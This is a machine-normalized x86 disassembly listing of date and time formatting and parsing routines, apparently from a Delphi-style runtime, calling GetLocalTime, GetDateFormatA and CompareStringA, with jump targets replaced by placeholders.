add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
movzx eax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
movzx ecx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
movzx ecx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
movzx ecx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40bdc0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_40bc74
pop esi
pop ecx
pop ebp
retn 0x8
sub_40bde0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40b9ec
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40be08
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx ecx [ esp + 0xe ]
movzx edx [ esp + 0xa ]
movzx eax [ esp + 0x8 ]
call sub_40bc44
fstp [ esp + 0x18 ]
fwait
movzx eax [ esp + 0x16 ]
push eax
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
movzx eax [ esp + 0x14 ]
call sub_40baa0
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_40be6c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402f9c
sub_40beb0
push ebp
mov ebp esp
mov edx eax
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40be6c
pop ecx
pop ebp
retn
sub edx 0x4
mov edx [ edx ]
sub_40becc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40a634
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40be6c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bf18
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
movzx ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40bf44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40bf7c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40bae0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40bfbc
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x11c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40c11e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c125
lea eax [ ebp - 0x11c ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4050b4
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40e738
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_405384
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e598
cmp eax 0x4
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebx ]
mov edx 0x3
call sub_40e6b4
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x11c ]
mov edx esi
call sub_40503c
mov eax [ ebp - 0x11c ]
mov edx 0x2
call sub_40e738
mov ecx eax
mov eax ebx
mov edx esi
call sub_404f34
sub_40c138
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40c226
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c22d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4050b4
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_405384
sub esi 0x4
mov esi [ esi ]
sub_40c250
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_40c9d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c9db
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404e68
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov [ ebp - 0x1e ] 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1f ] 0x0
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ edi ]
movzx eax [ eax ]
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ edi ]
call sub_40e7c8
mov [ edi ] eax
movzx ebx [ ebp - 0x5 ]
mov eax ebx
add al 0x9f
sub al 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
call sub_40e7a8
mov edx eax
mov eax [ edi ]
call sub_40be6c
pop ecx
mov eax [ edi ]
call sub_40e7c8
mov [ edi ] eax
mov [ ebp - 0x1e ] 0x20
jmp r-xdata
mov eax ebx
add al 0xbf
sub al 0x1a
jae r-xdata
sub bl 0x20
movzx eax bl
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp bl 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40be6c
pop ecx
movzx eax [ eax + lookup_table_40c338 ]
jmp [ eax * 4 + jump_table_40c371 ]
mov [ ebp - 0x1e ] bl
cmp [ ebp - 0x1e ] 0x48
jne r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf44
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40bfbc
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40beb0
pop ecx
jmp r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_40c138
pop ecx
mov eax [ ebp - 0x2c ]
call sub_40beb0
pop ecx
jmp r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40bf18
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf7c
pop ecx
mov [ ebp - 0x20 ] 0x0
mov esi [ edi ]
jmp r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf7c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf7c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40bf18
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40bf18
pop ecx
push ebp
call sub_40bf7c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40bf7c
pop ecx
mov esi [ edi ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
push ebp
call sub_40bf18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
push ebp
call sub_40bf7c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ edi ]
jmp r-xdata
mov bl 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40becc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40becc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40be6c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40be6c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40be6c
pop ecx
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bde0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x22 ] ax
cmp [ ebp - 0x1f ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40be6c
pop ecx
add [ edi ] 0x4
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ edi ]
sub edx esi
mov eax esi
call sub_40be6c
pop ecx
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi ]
movzx eax [ eax ]
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bde0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40e7c8
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40be6c
pop ecx
add [ edi ] 0x2
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x2
inc [ edi ]
jmp r-xdata
mov eax [ edi ]
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x22 ]
mov edx [ ebp - 0xc ]
call sub_40becc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp [ ebp - 0x22 ] 0xc
jbe r-xdata
mov [ ebp - 0x22 ] 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bde0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
add [ edi ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40beb0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40beb0
pop ecx
jmp r-xdata
inc [ edi ]
mov eax [ edi ]
call sub_40e7c8
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c250
pop ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub [ ebp - 0x22 ] 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40be6c
pop ecx
jmp r-xdata
push ebp
call sub_40bf44
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bde0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40beb0
pop ecx
add [ edi ] 0x2
jmp r-xdata
add [ edi ] 0x3
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40a484
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x20 ]
xor al 0x1
mov [ ebp - 0x20 ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a484
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a484
test eax eax
jne r-xdata
jmp r-xdata
sub_40ca08
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40c250
pop ecx
push ebp
mov eax ebx
call sub_40c250
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404f34
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40ca78
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_405120
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40ca9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ca78
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_405120
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
movzx eax [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
movzx edx [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40cb30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40cbf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbfd
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40ca78
mov esi ebx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov esi ebx
test esi esi
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x10 ]
call sub_405324
push eax
push esi
mov eax ebx
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
add [ edx ] eax
mov [ ebp - 0x9 ] 0x1
sub eax 0x4
mov eax [ eax ]
sub_40cc08
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40ca78
mov eax esi
test eax eax
je r-xdata
cmp eax [ edi ]
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
movzx eax [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40cc44
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_405120
cmp edi eax
jle r-xdata
movzx eax [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40cc90
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_405120
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40e808
mov [ ebx ] eax
jmp r-xdata
sub_40ccd8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405324
push eax
mov eax [ ebx ]
call sub_405324
pop edx
call sub_40e9f0
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40cd2c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40be58
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40cd88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40d0aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xd ] 0x0
mov eax [ rw-data ]
call sub_40cc44
mov [ ebp - 0xe ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40e924
test eax eax
jle r-xdata
mov edx ebx
mov eax esi
call sub_40cc90
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_405384
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x8 ]
call sub_4093d8
mov eax [ ebp - 0x8 ]
call sub_40ccd8
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x19 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40ca9c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0b1
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cc08
test al al
je r-xdata
lea eax [ ebp - 0x1a ]
push eax
lea ecx [ ebp - 0x12 ]
mov edx ebx
mov eax esi
call sub_40ca9c
test al al
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cc08
test al al
je r-xdata
call sub_40be58
mov edi eax
cmp [ ebp - 0xe ] 0x1
jne r-xdata
lea eax [ ebp - 0x1b ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
call sub_40ca9c
test al al
je r-xdata
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
jmp r-xdata
movzx eax [ ebp - 0xe ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
push eax
movzx ecx [ ebp - 0x18 ]
movzx edx [ ebp - 0x16 ]
mov eax edi
call sub_40bb78
mov [ ebp - 0xd ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_405468
